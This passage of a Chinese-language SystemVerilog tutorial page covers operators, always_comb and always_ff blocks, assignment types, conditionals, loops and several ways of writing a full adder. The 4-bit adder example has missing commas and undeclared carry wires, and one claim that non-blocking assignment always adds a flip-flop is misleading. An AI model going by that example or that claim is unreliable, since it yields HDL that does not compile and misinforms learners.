style="text-align:center">4b1101</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">4b1100</td><td style="text-align:center">4b1101</td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">4b110Z</td><td style="text-align:center">4b110Z</td><td style="text-align:center">X</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">4b11XX</td><td style="text-align:center">4b11XX</td><td style="text-align:center">X</td><td style="text-align:center">1</td></tr></tbody></table></div><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><p>算术运算符并不是最基本的运算符, 需要使用对应的门电路组织成的组合逻辑来完成. 这是语言内部提供的高层的逻辑单元功能, 方便在开发的时候直接集成使用, 而不需要采用模块调用的方式. 在处理器的设计中, 算术运算符的最重要的作用是用来构成 ALU.</p><h4 id="位拼接运算符"><a href="#位拼接运算符" class="headerlink" title="位拼接运算符"></a>位拼接运算符</h4><p>位拼接运算符 <code>{ }</code> 能够把多个信号拼接为向量的形式. <code>{a[3:0], b[7:6],c}</code> 代表了将 <code>a</code> 的第 3 至第 0 位, <code>b</code> 的第 7 位和第 6 位, 以及信号 <code>c</code> 拼接在一起, 构成一个新的信号向量. </p><h2 id="SystemVerilog-的行为语句"><a href="#SystemVerilog-的行为语句" class="headerlink" title="SystemVerilog 的行为语句"></a>SystemVerilog 的行为语句</h2><h3 id="关于硬件描述语言功能的讨论"><a href="#关于硬件描述语言功能的讨论" class="headerlink" title="关于硬件描述语言功能的讨论"></a>关于硬件描述语言功能的讨论</h3><p>行为语句是 SystemVerilog 中最为重要的功能语句, 用来定义具体模块的行为. 在术语上一直使用的是硬件<strong>描述语言</strong>这样的叙述方式, 而不是硬件<strong>设计语言</strong>. 因为硬件描述语言大部分没有说明底层的硬件构成, 更多阐述模块对外的功能表现.</p><p>在使用硬件描述语言的时候, 更多的是描述对应的电路模块应具有什么功能. 硬件语言的编译器会翻译为对应的底层硬件的实现, 有一定的中立性, 不依赖于具体的物理实现方式. 因此, 描述完成之后不一定是可以综合的 (可物理实现的). 在开发的时候, 时刻要注意程序最终需要被转化为硬件电路. </p><h3 id="SystemVerilog-的行为语句综述"><a href="#SystemVerilog-的行为语句综述" class="headerlink" title="SystemVerilog 的行为语句综述"></a>SystemVerilog 的行为语句综述</h3><p>SystemVerilog 的行为语句包括赋值语句, 过程语句, 条件语句, 编译指导语句等. 不是所有的行为语句都是可以综合的, 但不可综合的行为语句作用也十分重要, 会被应用到仿真环境中. 在 SystemVerilog 中可综合的行为语句主要包括以下部分: </p><ol><li><code>always</code> 过程语句;</li><li>使用 <code>begin-end</code> 组合的语句块;</li><li>可以进行持续赋值的语句 <code>assign</code>; </li><li>阻塞的过程赋值语句 <code>=</code>, 非阻塞的过程赋值语句 <code>&lt;=</code>;</li><li><code>for</code> 循环语句. </li></ol><h3 id="always-过程语句"><a href="#always-过程语句" class="headerlink" title="always 过程语句"></a>always 过程语句</h3><p>一个模块的多个 <code>always</code> 过程语句是并行执行的. 在实现的时候, 通常会使用两种 <code>always</code> 过程语句: </p><ul><li><code>always_comb</code>: 用来实现<strong>组合逻辑</strong>;</li><li><code>always_ff</code>: 用来实现<strong>时钟边沿触发的时序逻辑</strong>.</li></ul><h4 id="always-comb-过程语句"><a href="#always-comb-过程语句" class="headerlink" title="always_comb 过程语句"></a>always_comb 过程语句</h4><p><code>always_comb</code> 过程语句的使用方法如下: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token important">always_comb</span>     语句 <span class="token punctuation">(</span>可以是一条语句<span class="token punctuation">,</span> 或者是语句块<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果只有一条语句, 不需要加 <code>begin end</code> 构成语句块; 如果超过一条则需要构造成语句块. 更加经常使用的形式是如下形式:</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token important">always_comb</span><span class="token keyword">begin</span>    <span class="token comment">//本过程的功能描述</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一个四选一数据选择器的模块例子: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> mux4_1 <span class="token punctuation">(</span>    <span class="token keyword">input</span> din1<span class="token punctuation">,</span>    <span class="token keyword">input</span> din2<span class="token punctuation">,</span>    <span class="token keyword">input</span> din3<span class="token punctuation">,</span>    <span class="token keyword">input</span> din4<span class="token punctuation">,</span>    <span class="token keyword">input</span> se1<span class="token punctuation">,</span>    <span class="token keyword">input</span> se2<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">reg</span> out<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token important">always_comb</span>        <span class="token keyword">case</span> <span class="token punctuation">(</span><span class="token operator">{</span>se1<span class="token punctuation">,</span>se2<span class="token operator">}</span><span class="token punctuation">)</span>            <span class="token number">2'b00</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> din1<span class="token punctuation">;</span>            <span class="token number">2'b01</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> din2<span class="token punctuation">;</span>            <span class="token number">2'b10</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> din3<span class="token punctuation">;</span>            <span class="token number">2'b11</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> din4<span class="token punctuation">;</span>        <span class="token keyword">endcase</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个 <code>always_comb</code> 过程语句的有四个输入信号以及两个选择信号, 任何一个发生变化, 输出都将发生变化. </p><h4 id="always-ff-过程语句"><a href="#always-ff-过程语句" class="headerlink" title="always_ff 过程语句"></a>always_ff 过程语句</h4><p>在实现时序逻辑的时候, 需要在上升沿或者下降沿事件中触发寄存器的更新. 在 SystemVerilog 中, 使用 <code>posedge</code> 指定上升沿, 使用 <code>negedge</code> 指定下降沿. 可以将边沿敏感类型的信号放置到 <code>always_ff</code>: </p><pre class="line-numbers language-none"><code class="language-none">always_ff @(posedge clk)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里响应的是一个时钟 <code>clk</code> 的上升沿信号, 时钟是驱动处理器执行的基础, 在进行综合的时候会综合出时序电路. </p><h3 id="begin-end-块语句"><a href="#begin-end-块语句" class="headerlink" title="begin/end 块语句"></a>begin/end 块语句</h3><p><code>begin/end</code> 能够将多条语句组合成语句块.</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> decoder2_4 <span class="token punctuation">(</span>    <span class="token keyword">input</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> in<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> out<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token important">always_comb</span> <span class="token keyword">begin</span>        out <span class="token operator">=</span> <span class="token number">4'b0000</span><span class="token punctuation">;</span>        <span class="token function">case</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span>            <span class="token number">2'b00</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> <span class="token number">4'b0001</span><span class="token punctuation">;</span>            <span class="token number">2'b01</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> <span class="token number">4'b0010</span><span class="token punctuation">;</span>            <span class="token number">2'b10</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> <span class="token number">4'b0100</span><span class="token punctuation">;</span>            <span class="token number">2'b11</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> <span class="token number">4'b1000</span><span class="token punctuation">;</span>        <span class="token keyword">endcase</span>    <span class="token keyword">end</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为需要一个初值, 在 <code>begin/end</code> 中有两条语句, 必须构造出一个语句块, 也往往被称为是串行块, 其含义就是 “顺序执行” 的. 在硬件综合完成之后, 各个部分的电信号就开始驱动整个硬件电路信号扩散, 并逐步稳定下来, 输出会随着输入的变化而随时变化. </p><h3 id="赋值语句"><a href="#赋值语句" class="headerlink" title="赋值语句"></a>赋值语句</h3><p>赋值语句可以将不同的信号组织起来, 包括了持续赋值语句和过程赋值语句. 持续赋值语句在过程外使用, 与过程语句并行执行. 过程赋值语句在过程内串行执行, 用于描述过程的功能.</p><h4 id="持续赋值语句"><a href="#持续赋值语句" class="headerlink" title="持续赋值语句"></a>持续赋值语句</h4><p>在 SystemVerilog 中使用 <code>assign</code> 作为持续赋值语句使用, 用于对 <code>wire</code> 类型的变量进行赋值. 其对应的硬件即通过对输出进行赋值, 当输入变化时, 经过一定延迟, 输出就会按照 <code>assign</code> 所描述的那样发生变化. 例如: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">assign</span> res <span class="token operator">=</span> input_a <span class="token operator">&amp;</span> input_b<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在一个模块中, 可以有多个 <code>assign</code> 的持续赋值语句并行执行. 一个模块的持续赋值语句和前面所说的 <code>always</code> 过程语句可以出现多次, 执行关系也是并行的.</p><h4 id="过程赋值语句"><a href="#过程赋值语句" class="headerlink" title="过程赋值语句"></a>过程赋值语句</h4><p>在 <code>always</code> 过程里面的赋值语句被称为过程赋值语句, 一般用来对 <code>reg</code> 类型的变量进行赋值. 一个是非阻塞赋值语句 <code>&lt;=</code>, 一个是阻塞赋值语句 <code>=</code>. 之间的区别是: </p><ul><li>非阻塞赋值语句 <code>&lt;=</code> 不立即更新被赋值的信号, 等到整个过程块结束时才更新. 由于不是立即发生的, 在过程内仿佛这条语句不存在一样. 在这个执行的过程中, 所有的左值会维持不变, 反映了时钟边沿触发的寄存器的行为特征, 在 <code>always_ff</code> 中需要采用非阻塞赋值. </li></ul><ol><li>阻塞赋值语句 <code>=</code> 立即完成赋值操作, 左值立刻发生变化. 一个块语句中存在多条阻塞赋值语句, 会按照先后顺序关系执行. 这种行为模式和网络 IO 编程中的阻塞函数调用方式一样, 完成函数执行之后调用才会退出. 这种特性可以用来直观描述组合逻辑的行为特征, 在 <code>always_comb</code> 中需要采用阻塞赋值.</li></ol><p>非阻塞赋值要比阻塞赋值多加一个触发器, 因为信号的变化不是同步的, 需要进行一个周期的延迟. </p><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><p>在 SystemVerilog 中, 条件语句包括了 <code>if-else</code> 语句以及 <code>case</code> 语句.</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> decoder2_4 <span class="token punctuation">(</span>    <span class="token keyword">input</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> din<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> dout<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token important">always_comb</span> <span class="token keyword">begin</span>        dout <span class="token operator">=</span> <span class="token number">4'b0000</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>din <span class="token operator">==</span> <span class="token number">2'b00</span><span class="token punctuation">)</span>            dout <span class="token operator">=</span> <span class="token number">4'b0001</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>din <span class="token operator">==</span> <span class="token number">2'b01</span><span class="token punctuation">)</span>            dout <span class="token operator">=</span> <span class="token number">4'b0010</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>din <span class="token operator">==</span> <span class="token number">2'b10</span><span class="token punctuation">)</span>            dout <span class="token operator">=</span> <span class="token number">4'b0100</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>din <span class="token operator">==</span> <span class="token number">2'b11</span><span class="token punctuation">)</span>            dout <span class="token operator">=</span> <span class="token number">4'b1000</span><span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 SystemVerilog 中也提供了 <code>case</code> 这样的条件判断语句, 避免使用过多的 if-else 进行编写.</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">case</span> <span class="token punctuation">(</span>敏感表达式<span class="token punctuation">)</span>    条件判断<span class="token number">1</span><span class="token punctuation">:</span> 语句<span class="token number">1</span><span class="token punctuation">;</span>     条件判断<span class="token number">2</span><span class="token punctuation">:</span> 语句<span class="token number">2</span><span class="token punctuation">;</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    条件判断n<span class="token punctuation">:</span> 语句n<span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token punctuation">:</span> 语句n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">endcase</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里语句不需要插入 <code>break</code>, 在语句执行完成后, 直接跳出了 case 语句本身, 这样的行为模式对于程序员来说更加友好. </p><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><p>SystemVerilog 中也存在循环语句. 可综合的循环语句为 <code>for</code> 语句. 循环语句不容易直观想象得出综合之后的效果, 描述的功能更加高层和抽象, 转化为硬件的难度会更大. 其它三个循环语句分别为 <code>forever</code> 语句, <code>repeat</code> 语句, <code>while</code> 语句. 其中 <code>forever</code> 语句会连续执行语句, 主要在仿真中使用, 生成周期性的波形 (时钟信号). </p><p><code>repeat</code> 语句: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token function">repeat</span><span class="token punctuation">(</span>循环次数的表达式<span class="token punctuation">)</span><span class="token keyword">begin</span>    语句或者语句块<span class="token keyword">end</span> <span class="token comment">// 单个语句不需要 begin 和 end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>while</code> 语句: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token function">while</span><span class="token punctuation">(</span>循环执行的条件表达式<span class="token punctuation">)</span><span class="token keyword">begin</span>    语句或者语句块<span class="token keyword">end</span> <span class="token comment">// 单个语句不需要 begin 和 end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>repeat</code> 和 <code>while</code> 往往不可综合, 编写代码时尽量使用 <code>for</code> 语句来实现循环.</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> for_adder <span class="token punctuation">(</span>    <span class="token keyword">input</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> a<span class="token punctuation">,</span>    <span class="token keyword">input</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> b<span class="token punctuation">,</span>    <span class="token keyword">input</span> cin<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> sum<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">reg</span> cout<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">reg</span> c<span class="token punctuation">;</span>    <span class="token keyword">integer</span> i<span class="token punctuation">;</span>    <span class="token important">always_comb</span> <span class="token keyword">begin</span>        c <span class="token operator">=</span> cin<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>            <span class="token operator">{</span>c<span class="token punctuation">,</span>sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">}</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> c<span class="token punctuation">;</span>        <span class="token keyword">end</span>        cout <span class="token operator">=</span> c<span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是一个功能描述的代码, 描述层次比较抽象, 不是功能设计的代码. </p><h2 id="SystemVerilog-的设计层次与风格"><a href="#SystemVerilog-的设计层次与风格" class="headerlink" title="SystemVerilog 的设计层次与风格"></a>SystemVerilog 的设计层次与风格</h2><p>SystemVerilog 的语言有很大的灵活性, 对于相同的电路可以有不同的设计方法. 一个 1 位全加器的输入包括 1 位的低位进位 <code>cin</code>, 两个 1 位的输入信号 <code>a</code> 和 <code>b</code>, 输出则包括了一个当前位的和 <code>sum</code> 以及向高位的进位 <code>cout</code>. 从 1 位全加器的真值表可以获得逻辑表达式 (这里只使用与或非门的表达): </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CarryOut</span><span class="token operator">=</span><span class="token punctuation">(</span>¬A*B*CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>A*¬B*CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>A*B*¬CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>A*B*CarryIn<span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span>B*CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>A*CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>A*B<span class="token punctuation">)</span><span class="token assign-left variable">Sum</span><span class="token operator">=</span><span class="token punctuation">(</span>¬A*¬B*CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>¬A*B*¬CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>A*¬B*¬CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>A*B*CarryIn<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>很容易获得 1 位全加器的电路表达形式: </p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013742.png" alt=""></p><p>在上述的电路中, 使用了三个非门 <code>not</code>, 四个 3 输入的与门 <code>and</code>, 三个 2 输入的与门 <code>and</code>, 一个 4 输入的或门 <code>or</code>, 一个 3 输入的或门 <code>or</code>. 这里的非门, 与门和或门都是 SystemVerilog 中内置的门电路, 可以直接构造出 SystemVerilog 的结构描述. </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> full_adder1 <span class="token punctuation">(</span>    <span class="token keyword">input</span> a<span class="token punctuation">,</span>    <span class="token keyword">input</span> b<span class="token punctuation">,</span>    <span class="token keyword">input</span> cin<span class="token punctuation">,</span>    <span class="token keyword">output</span> sum<span class="token punctuation">,</span>    <span class="token keyword">output</span> cout<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">wire</span> a_n<span class="token punctuation">,</span> b_n<span class="token punctuation">,</span> cin_n<span class="token punctuation">,</span> sum_p1<span class="token punctuation">,</span>sum_p2<span class="token punctuation">,</span>sum_p3<span class="token punctuation">,</span>sum_p4<span class="token punctuation">,</span> cout_p1<span class="token punctuation">,</span> cout_p2<span class="token punctuation">,</span> cout_p3<span class="token punctuation">;</span>    <span class="token function">not</span><span class="token punctuation">(</span>a_n<span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>b_n<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>cin_n<span class="token punctuation">,</span>cin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">and</span><span class="token punctuation">(</span>sum_p1<span class="token punctuation">,</span>a_n<span class="token punctuation">,</span>b_n<span class="token punctuation">,</span>cin<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>sum_p2<span class="token punctuation">,</span>a_n<span class="token punctuation">,</span>b<span class="token punctuation">,</span>cin_n<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>sum_p3<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b_n<span class="token punctuation">,</span>cin_n<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>sum_p4<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>cin<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>cout_p1<span class="token punctuation">,</span>b<span class="token punctuation">,</span>cin<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>cout_p2<span class="token punctuation">,</span>a<span class="token punctuation">,</span>cin<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>cout_p3<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">or</span><span class="token punctuation">(</span>sum<span class="token punctuation">,</span>sum_p1<span class="token punctuation">,</span>sum_p2<span class="token punctuation">,</span>sum_p3<span class="token punctuation">,</span>sum_p4<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>cout<span class="token punctuation">,</span>cout_p1<span class="token punctuation">,</span>cout_p2<span class="token punctuation">,</span>cout_p3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>门级结构描述虽然不是最底层的描述 (晶体管搭建), 但是已经非常接近, 可以使用元件进行直接映射. 这种方法一般用于设计比较简单或者高效的工作电路, 方便综合器直接进行综合.</p><p>门级结构描述虽然方便了底层的综合器, 但是对于编程来说不方便, 希望能够进行更加高层的设计, 一个选择是将上述的逻辑表达式写到程序里, 这是数据流描述方法. </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> full_adder1 <span class="token punctuation">(</span>    <span class="token keyword">input</span> a<span class="token punctuation">,</span>    <span class="token keyword">input</span> b<span class="token punctuation">,</span>    <span class="token keyword">input</span> cin<span class="token punctuation">,</span>    <span class="token keyword">output</span> sum<span class="token punctuation">,</span>    <span class="token keyword">output</span> cout<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">assign</span> sum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">~</span>a<span class="token operator">&amp;~</span>b<span class="token operator">&amp;</span>cin<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token operator">~</span>a<span class="token operator">&amp;</span>b<span class="token operator">&amp;~</span>cin<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>a<span class="token operator">&amp;~</span>b<span class="token operator">&amp;~</span>cin<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>a<span class="token operator">&amp;</span>b<span class="token operator">&amp;</span>cin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">assign</span> cout <span class="token operator">=</span> <span class="token punctuation">(</span>b<span class="token operator">&amp;</span>cin<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>a<span class="token operator">&amp;</span>cin<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>a<span class="token operator">&amp;</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数据流描述方法描述了组合逻辑中, 输出是如何随着输入数据的变化而变化, 使用持续赋值语句 <code>assign</code>. 但是, 数据流描述的抽象层次还不是很高, 对于复杂的硬件逻辑设计来说, 使用行为级描述, 即直接描述出硬件所需要完成的功能更为妥当. </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> full_adder1 <span class="token punctuation">(</span>    <span class="token keyword">input</span> a<span class="token punctuation">,</span>    <span class="token keyword">input</span> b<span class="token punctuation">,</span>    <span class="token keyword">input</span> cin<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">reg</span> sum<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">reg</span> cout<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token important">always_comb</span> <span class="token keyword">begin</span>        <span class="token operator">{</span>cout<span class="token punctuation">,</span>sum<span class="token operator">}=</span>a<span class="token operator">+</span>b<span class="token operator">+</span>cin<span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从行为级描述中看不到电路怎样使用元件以及怎样布线, 但是完整描述了一个全加器所需要完成的功能. </p><p>在设计更加大型的硬件电路的时候, 使用结构级描述是必不可少的. 可以设计一些小型电路模块, 通过结构描述设计出规模更大的电路. 通过设计 4 位的加法器来说明: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> full_adder4 <span class="token punctuation">(</span>    <span class="token keyword">input</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> a<span class="token punctuation">,</span>    <span class="token keyword">input</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> b<span class="token punctuation">,</span>    <span class="token keyword">input</span> cin<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> sum<span class="token punctuation">,</span>    <span class="token keyword">output</span> cout<span class="token punctuation">)</span><span class="token punctuation">;</span>    full_adder1 <span class="token function">a0</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cin<span class="token punctuation">,</span>sum<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cin1<span class="token punctuation">)</span><span class="token punctuation">;</span>    full_adder1 <span class="token function">a1</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cin1sum<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cin2<span class="token punctuation">)</span><span class="token punctuation">;</span>    full_adder1 <span class="token function">a2</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cin2sum<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cin3<span class="token punctuation">)</span><span class="token punctuation">;</span>    full_adder1 <span class="token function">a3</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cin3sum<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cout<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在实际进行硬件设计的时候, 出发点还是自顶向下, 对硬件总体先分成多个互相独立的模块, 然后定义之间的连线关系, 连线关系即是它们之间的接口, 最终完成的硬件通过结构描述方式将模块连接在一起. </p><h2 id="一些编程建议与经验"><a href="#一些编程建议与经验" class="headerlink" title="一些编程建议与经验"></a>一些编程建议与经验</h2><h3 id="default-nettype-none"><a href="#default-nettype-none" class="headerlink" title="`default_nettype none"></a><code>`default_nettype none</code></h3><p>SystemVerilog 中没有被定义的标记 label 都被默认为是 <code>wire</code> 类型的, 建议的做法是 <code>`default_nettype none</code>. 